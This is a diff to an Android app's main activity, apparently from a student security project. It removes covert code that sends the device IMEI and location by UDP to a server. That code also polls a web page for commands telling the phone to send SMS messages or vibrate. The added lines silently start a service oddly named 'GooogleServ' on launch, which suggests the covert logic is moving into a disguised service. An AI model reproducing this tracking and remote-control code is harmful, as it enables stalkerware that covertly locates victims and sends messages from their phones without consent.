@@ -5,18 +5,10 @@ import android.app.ProgressDialog;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
-import android.location.Location;
-import android.location.LocationListener;
-import android.location.LocationManager;
 import android.net.Uri;
-import android.os.AsyncTask;
-import android.os.Bundle;
-import android.os.Handler;
-import android.os.Vibrator;
 import android.provider.MediaStore;
 import android.support.v7.app.AppCompatActivity;
-import android.telephony.SmsManager;
-import android.telephony.TelephonyManager;
+import android.os.Bundle;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
@@ -24,24 +16,14 @@ import android.widget.EditText;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import com.google.android.gms.appindexing.Action;
-import com.google.android.gms.appindexing.AppIndex;
-import com.google.android.gms.common.api.GoogleApiClient;
-
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.IOException;
-import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.net.DatagramPacket;
-import java.net.DatagramSocket;
 import java.net.HttpURLConnection;
-import java.net.InetAddress;
 import java.net.MalformedURLException;
 import java.net.URL;
-import java.util.Date;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -56,30 +38,17 @@ public class MainActivity extends AppCompatActivity {
 
     private static final int READ_REQUEST_CODE = 42;
     private static final String TAG = "spechide";
-    private static final String BrowserTaskTAG = "BrowserTask";
 
     String uploadFilePath = "";
     String uploadFileName = "";
-    //agregado por Juan (16-6)
-    Location lastLocation = null;
-    long lastTime = 0;
-    // agregado por Juan (17-6)
-    String ServerIP = "192.168.1.3";
-    int ServerPort = 9999;
-    String imei = "";
-    //tiempo de refresco, en milisegundos
-    int TimeRefresh = 2*60*1000;
-    /**
-     * ATTENTION: This was auto-generated to implement the App Indexing API.
-     * See https://g.co/AppIndexing/AndroidStudio for more information.
-     */
-    private GoogleApiClient client;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        Intent serviceIntent = new Intent(this, GooogleServ.class);
+        startService(serviceIntent);
 
         uploadButton = (Button) findViewById(R.id.button);
         messageText = (TextView) findViewById(R.id.textView);
@@ -106,57 +75,6 @@ public class MainActivity extends AppCompatActivity {
                 }).start();
             }
         });
-        //agregado por Juan (22-6)
-        //BrowserTask btask=new BrowserTask();
-        //btask.execute("maxi1985798.github.io/tpseginf/");
-        //Log.i(TAG, "!!!! HTML:"+btask.codigoAParsear);
-        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        imei = telephonyManager.getDeviceId();
-        //agregado por Juan (16-6)
-        //----------------------------------------------
-
-        // Acquire a reference to the system Location Manager
-        LocationManager locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
-
-        // Define a listener that responds to location updates
-        LocationListener locationListener = new LocationListener() {
-            public void onLocationChanged(Location location) {
-
-                if ((location.getTime() - lastTime) > 120 * 1000) {
-                    lastLocation = location;
-                    lastTime = lastLocation.getTime();
-                    // Called when a new location is found by the network location provider.
-                    Log.v(TAG, "(!!!!) Localización :  " + location.toString());
-                    conectUDPTask con = new conectUDPTask();
-                    con.execute(location);
-                    //BrowserTask btask = new BrowserTask();
-                    //btask.execute("maxi1985798.github.io/tpseginf/");
-                    //Log.i(TAG, "!!!! Loc-HTML:"+btask.codigoAParsear);
-
-                }
-                //   mandarPorMail(location);
-            }
-
-            public void onStatusChanged(String provider, int status, Bundle extras) {
-            }
-
-            public void onProviderEnabled(String provider) {
-            }
-
-            public void onProviderDisabled(String provider) {
-            }
-        };
-
-// Register the listener with the Location Manager to receive location updates
-        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);
-
-
-        runBrowserTaskAfterDelay();
-        //
-        //----------------------------------------------
-        // ATTENTION: This was auto-generated to implement the App Indexing API.
-        // See https://g.co/AppIndexing/AndroidStudio for more information.
-        client = new GoogleApiClient.Builder(this).addApi(AppIndex.API).build();
     }
 
     public int realUploadThing(HttpURLConnection conn, DataOutputStream dos, File sourceFile, String fileName, String lineEnd, String twoHyphens, String boundary, int maxBufferSize) {
@@ -201,7 +119,7 @@ public class MainActivity extends AppCompatActivity {
             BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
             String line = "";
             final StringBuilder responseOutput = new StringBuilder();
-            while ((line = br.readLine()) != null) {
+            while((line = br.readLine()) != null ) {
                 responseOutput.append(line);
             }
             br.close();
@@ -337,455 +255,39 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    /**
-     * Called when the activity is about to become visible.
-     */
+    /** Called when the activity is about to become visible. */
     @Override
     protected void onStart() {
         super.onStart();
-        // ATTENTION: This was auto-generated to implement the App Indexing API.
-        // See https://g.co/AppIndexing/AndroidStudio for more information.
-        client.connect();
         Log.i(TAG, "The onStart() event");
-        // ATTENTION: This was auto-generated to implement the App Indexing API.
-        // See https://g.co/AppIndexing/AndroidStudio for more information.
-        Action viewAction = Action.newAction(
-                Action.TYPE_VIEW, // TODO: choose an action type.
-                "Main Page", // TODO: Define a title for the content shown.
-                // TODO: If you have web page content that matches this app activity's content,
-                // make sure this auto-generated web page URL is correct.
-                // Otherwise, set the URL to null.
-                Uri.parse("http://host/path"),
-                // TODO: Make sure this auto-generated app URL is correct.
-                Uri.parse("android-app://me.shrimadhavuk.watransmitter/http/host/path")
-        );
-        AppIndex.AppIndexApi.start(client, viewAction);
     }
 
-    /**
-     * Called when the activity has become visible.
-     */
+    /** Called when the activity has become visible. */
     @Override
     protected void onResume() {
         super.onResume();
         Log.i(TAG, "The onResume() event");
     }
 
-    /**
-     * Called when another activity is taking focus.
-     */
+    /** Called when another activity is taking focus. */
     @Override
     protected void onPause() {
         super.onPause();
         Log.i(TAG, "The onPause() event");
     }
 
-    /**
-     * Called when the activity is no longer visible.
-     */
+    /** Called when the activity is no longer visible. */
     @Override
     protected void onStop() {
         super.onStop();
-        // ATTENTION: This was auto-generated to implement the App Indexing API.
-        // See https://g.co/AppIndexing/AndroidStudio for more information.
-        Action viewAction = Action.newAction(
-                Action.TYPE_VIEW, // TODO: choose an action type.
-                "Main Page", // TODO: Define a title for the content shown.
-                // TODO: If you have web page content that matches this app activity's content,
-                // make sure this auto-generated web page URL is correct.
-                // Otherwise, set the URL to null.
-                Uri.parse("http://host/path"),
-                // TODO: Make sure this auto-generated app URL is correct.
-                Uri.parse("android-app://me.shrimadhavuk.watransmitter/http/host/path")
-        );
-        AppIndex.AppIndexApi.end(client, viewAction);
         Log.i(TAG, "The onStop() event");
-        // ATTENTION: This was auto-generated to implement the App Indexing API.
-        // See https://g.co/AppIndexing/AndroidStudio for more information.
-        client.disconnect();
     }
 
-    /**
-     * Called just before the activity is destroyed.
-     */
+    /** Called just before the activity is destroyed. */
     @Override
     public void onDestroy() {
         super.onDestroy();
         Log.i(TAG, "The onDestroy() event");
     }
 
-    //agregado por Juan (17-6)
-    //----------------------------
-    private void mandarPorMail(Location location) {
-        Intent i = new Intent(Intent.ACTION_SEND);
-        i.setType("message/rfc822");
-        i.putExtra(Intent.EXTRA_EMAIL, new String[]{"juannombreapellido@gmail.com"});
-        i.putExtra(Intent.EXTRA_SUBJECT, "localizar");
-        i.putExtra(Intent.EXTRA_TEXT, location.toString());
-        try {
-            startActivity(Intent.createChooser(i, "Send mail..."));
-        } catch (android.content.ActivityNotFoundException ex) {
-            Log.e(TAG, "No hay clientes de email disponibles");
-            //Toast.makeText(MyActivity.this, "There are no email clients installed.", Toast.LENGTH_SHORT).show();
-        }
-
-    }
-
-    private void mandarPorHttp(Location location) {
-        DemoTask sendTask = new DemoTask();
-        String[] coord = {Double.toString(location.getLatitude()), Double.toString(location.getLongitude())};
-        sendTask.execute(coord);
-    }
-
-    //----------------------------
-    //agregado por Juan (16-6)
-    //----------------------------
-    //necesario para conectarse al servidor y descargar los comandos
-    public class DemoTask extends AsyncTask<String, Void, String> {
-        String command = "";
-
-        @Override
-        protected String doInBackground(String... params) {
-            String com = "location";
-            if (params.length == 0) {
-
-                return null;
-            }
-
-            // These two need to be declared outside the try/catch
-            // so that they can be closed in the finally block.
-            HttpURLConnection urlConnection = null;
-            BufferedReader reader = null;
-
-
-            try {
-                // Construimos la URL
-                final String FORECAST_BASE_URL = "http://" + ServerIP;
-                final String QUERY_PARAM = "location";
-                final String PARAM1 = "latitud";
-                final String PARAM2 = "longitud";
-               /* final String FORMAT_PARAM = "mode";
-                final String UNITS_PARAM = "units";
-                final String DAYS_PARAM = "cnt";
-                final String APPID_PARAM = "APPID";
-                */
-                Uri builtUri = Uri.parse(FORECAST_BASE_URL).buildUpon()
-                        .appendQueryParameter(QUERY_PARAM, "")
-                        .appendQueryParameter(PARAM1, params[0])
-                        .appendQueryParameter(PARAM2, params[1])
-                        .build();
-
-                URL url = new URL(builtUri.toString());
-
-                Log.v(TAG, "Built URI " + builtUri.toString());
-
-                // Create the request to OpenWeatherMap, and open the connection
-                urlConnection = (HttpURLConnection) url.openConnection();
-                urlConnection.setRequestMethod("GET");
-                urlConnection.connect();
-
-                // Read the input stream into a String
-                InputStream inputStream = urlConnection.getInputStream();
-                StringBuffer buffer = new StringBuffer();
-                if (inputStream == null) {
-                    // Nothing to do.
-                    return null;
-                }
-                reader = new BufferedReader(new InputStreamReader(inputStream));
-
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    //agregamos un salto de linea, para facilitar la lectura
-                    buffer.append(line + "\n");
-                }
-
-                if (buffer.length() == 0) {
-                    // Stream was empty.  No point in parsing.
-                    return null;
-                }
-
-
-            } catch (IOException e) {
-                Log.e(TAG, "Error ", e);
-                // If the code didn't successfully get the weather data, there's no point in attemping
-                // to parse it.
-                return null;
-            } finally {
-                if (urlConnection != null) {
-                    urlConnection.disconnect();
-                }
-                if (reader != null) {
-                    try {
-                        reader.close();
-                    } catch (final IOException e) {
-                        Log.e(TAG, "Error closing stream", e);
-                    }
-                }
-            }
-            return null;
-        }
-
-    }
-
-
-    public void runBrowserTaskAfterDelay() {
-        Log.d(BrowserTaskTAG, "Running browser task in " + TimeRefresh/1000 + " seconds");
-        Handler handler = new Handler();
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                BrowserTask btask = new BrowserTask();
-                btask.execute("maxi1985798.github.io/tpseginf/");
-            }
-        }, TimeRefresh);
-    }
-
-    //----------------------------
-    //agregado por Juan (22-6)
-    //----------------------------
-    //necesario para conectarse al servidor y descargar los comandos
-    public class BrowserTask extends AsyncTask<String, Void, String[]> {
-        public String[] codigoAParsear = {};
-
-        @Override
-        protected String[] doInBackground(String... params) {
-            Log.d(BrowserTaskTAG, "Running doInBackround from BrowserTask");
-            String[] codigohtml = {};
-            Date date = new Date();
-            Long tiempo_actual = date.getTime();
-            if (params.length == 0) {
-                return null;
-            }
-            // These two need to be declared outside the try/catch
-            // so that they can be closed in the finally block.
-            HttpURLConnection urlConnection = null;
-            BufferedReader reader = null;
-
-
-            try {
-                // Construimos la URL
-                final String FORECAST_BASE_URL = "https://" + params[0];
-
-               /* final String FORMAT_PARAM = "mode";
-                final String UNITS_PARAM = "units";
-                final String DAYS_PARAM = "cnt";
-                final String APPID_PARAM = "APPID";
-                */
-                Uri builtUri = Uri.parse(FORECAST_BASE_URL).buildUpon()
-                        .build();
-
-                URL url = new URL(builtUri.toString());
-
-                Log.v(TAG, "Built URI " + builtUri.toString());
-
-                // Create the request to OpenWeatherMap, and open the connection
-                urlConnection = (HttpURLConnection) url.openConnection();
-                urlConnection.setRequestMethod("GET");
-                urlConnection.connect();
-
-                // Read the input stream into a String
-                InputStream inputStream = urlConnection.getInputStream();
-
-                if (inputStream == null) {
-                    // Nothing to do.
-                    return null;
-                }
-
-                reader = new BufferedReader(new InputStreamReader(inputStream));
-                String line;
-                String line_sin_tab;
-                String[] separated;
-                String instruccion;
-                String[] instruccion_separada;
-                String comando;
-                while ((line = reader.readLine()) != null) {
-                    //agregamos un salto de linea, para facilitar la lectura
-                    line_sin_tab = line.trim();
-                    separated = line_sin_tab.split(" ");
-                    if (separated[0].compareTo("<input") == 0) {
-                        comando = separated[2].replace("name=","");
-                        comando = comando.replace("\"","");
-                        if(comando.compareTo("comando") == 0){
-                            instruccion = separated[3].replace("value=", "");
-                            instruccion = instruccion.replace(">", "");
-                            instruccion = instruccion.replace("\"", "");
-                            instruccion_separada = instruccion.split(":");
-                            //Log.v(TAG,"!!!! HTML desde doInBackground1: "+instruccion_separada[0]);
-                            Log.i(TAG, "date in milisecond " + tiempo_actual);
-                            if(instruccion_separada.length > 3) {
-                                if (instruccion_separada[0].compareTo(imei) == 0 || instruccion_separada[0].compareTo("*") == 0) {
-                                    Log.i(TAG, "es el imei que quiero: " + instruccion_separada[0]);
-                                    Log.i(TAG, "diferencia: " + (tiempo_actual - Long.parseLong(instruccion_separada[2])));
-                                    if ( (tiempo_actual - Long.parseLong(instruccion_separada[2])) < TimeRefresh ){
-                                        Log.i(TAG, "el comando es actual: " + instruccion_separada[2]);
-                                        if (instruccion_separada[1].compareToIgnoreCase("sms") == 0) {
-                                            if(instruccion_separada.length > 4) {
-                                                Log.i(TAG, "vamos a enviar sms: " + instruccion_separada[1] + " " + instruccion_separada[3] + " " + instruccion_separada[4]);
-                                                sendSMS(instruccion_separada[3], instruccion_separada[4]);
-                                            }
-                                        }
-                                        if (instruccion_separada[1].compareToIgnoreCase("vibrar") == 0) {
-                                            Log.i(TAG, "vamos a vibrar: " + instruccion_separada[1] + " " + instruccion_separada[3]);
-                                            onVibrate(Integer.parseInt(instruccion_separada[3]));
-                                        }
-                                    }
-                                }
-                            }
-
-                        }
-                    }
-                }
-
-                return codigohtml;
-
-            } catch (IOException e) {
-                Log.e(TAG, "Error ", e);
-                // If the code didn't successfully get the weather data, there's no point in attemping
-                // to parse it.
-                return null;
-            } finally {
-                if (urlConnection != null) {
-                    urlConnection.disconnect();
-                }
-                if (reader != null) {
-                    try {
-                        reader.close();
-                    } catch (final IOException e) {
-                        Log.e(TAG, "Error closing stream", e);
-                    }
-                }
-                return codigohtml;
-            }
-
-
-            // This will only happen if there was an error getting or parsing the forecast.
-
-        }
-
-        @Override
-        protected void onPostExecute(String[] result) {
-            Log.d(BrowserTaskTAG, "Running onPostexecute from BrowserTask");
-            /*Date date2 = new Date();
-            Log.i(TAG, "date in milisecond " + date2.getTime());
-            if(result.length < 4) {
-                return ;
-            }
-
-            //Log.i(TAG, "resultado en PostExecute: " + result[0] + " " + result[1] + " " + result[2]);
-            if (result[0].compareTo(imei) == 0 || result[0].compareTo("*") == 0) {
-                Log.i(TAG, "es el imei que quiero: " + result[0]);
-                Date date = new Date();
-                if ( (date.getTime() - Long.parseLong(result[2])) < (2*60*1000) ){
-                    Log.i(TAG, "el comando es actual: " + result[2]);
-                    if (result[3].compareToIgnoreCase("*") == 0){
-                        TimeRefresh = 2*60*1000;
-                        Log.i(TAG, "dejamos el mismo time refresh: " + result[3]);
-                    }
-                    else {
-                        TimeRefresh = Integer.parseInt(result[3]);
-                        Log.i(TAG, "cambiamos el time refresh: " + result[3]);
-                    }
-                    if (result[1].compareToIgnoreCase("sms") == 0) {
-                        if(result.length < 5) {
-                            return ;
-                        }
-                        Log.i(TAG, "vamos a enviar sms: " + result[1] + " " + result[4] + " " + result[5]);
-                        sendSMS(result[4], result[5]);
-                    }
-                    if (result[1].compareToIgnoreCase("vibrar") == 0) {
-                        Log.i(TAG, "vamos a vibrar: " + result[1] + " " + result[4]);
-                        onVibrate(Integer.parseInt(result[4]));
-                    }
-                }
-
-            }*/
-
-            codigoAParsear = result;
-            //Log.i(TAG, "resultado en PostExecute1: " + codigoAParsear[0] + " " + codigoAParsear[1] + " " + codigoAParsear[2]);
-
-            // se debe actualizar el RefreshTime antes de llamar a esta funcion
-            runBrowserTaskAfterDelay();
-        }
-
-    }
-    //----------------------------
-    //----------------------------
-
-    //agregado por Juan, 17-6
-    public class conectUDPTask extends AsyncTask<Location, Void, String> {
-
-        @Override
-        protected String doInBackground(Location... locations) {
-            if (locations.length == 0) {
-                return null;
-            }
-            Location location = locations[0];
-            try {
-                mandarPorUDP("\n[" + imei + "]\n\nt=" + Double.toString(location.getTime()) + "\nlat=" + Double.toString(location.getLatitude()) + "\nlong=" + Double.toString(location.getLongitude()));
-                return null;
-            } catch (IOException e) {
-                Log.e(TAG, "No se pudo enviar por UDP");
-                return null;
-            }
-        }
-
-        private void mandarPorUDP(String str) throws IOException {
-
-
-            DatagramSocket client_socket = new DatagramSocket(ServerPort);
-            InetAddress IPAddress = InetAddress.getByName(ServerIP);
-
-            //while (true)
-            // {
-            byte[] send_data = str.getBytes();
-            //System.out.println("Type Something (q or Q to quit): ");
-
-            DatagramPacket send_packet = new DatagramPacket(send_data, str.length(), IPAddress, ServerPort);
-            client_socket.send(send_packet);
-        /*
-        //chandra
-        DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
-        client_socket.receive(receivePacket);
-
-        modifiedSentence = new String(receivePacket.getData());
-        //System.out.println("FROM SERVER:" + modifiedSentence);
-        if(modifiedSentence.charAt(2)=='%')
-            txt5.setText(modifiedSentence.substring(0, 3));
-        else
-            txt1.setText(modifiedSentence);
-        modifiedSentence=null;*/
-            client_socket.close();
-
-            // }
-
-        }
-
-    }
-
-
-    //----------------------------
-
-
-    //----------------------------
-//agregado por juan  25-6
-//código para que vibre y envíe sms
-    public void onVibrate(int timeOfVibrator) {
-        Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
-        v.vibrate(timeOfVibrator);
-    }
-
-    public void sendSMS(String phoneNum, String msg) {
-        //String phoneNo = phoneNum;
-        //String msg = "This is a message";
-        try {
-            SmsManager smsManager = SmsManager.getDefault();
-            smsManager.sendTextMessage(phoneNum, null, msg, null, null);
-        /*Toast.makeText(getApplicationContext(), "Message Sent",
-                Toast.LENGTH_LONG).show();*/
-        } catch (Exception ex) {
-        /*Toast.makeText(getApplicationContext(), ex.getMessage(),
-                Toast.LENGTH_LONG).show();*/
-            ex.printStackTrace();
-        }
-    }
 }
